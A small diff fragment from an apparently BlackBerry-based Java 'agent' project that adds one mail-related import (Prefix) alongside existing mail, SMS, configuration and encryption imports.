@@ -29,6 +29,7 @@ import blackberry.agent.mail.Filter;
 import blackberry.agent.mail.Mail;
 import blackberry.agent.mail.MailListener;
 import blackberry.agent.mail.MailParser;
+import blackberry.agent.mail.Prefix;
 import blackberry.agent.sms.SmsListener;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
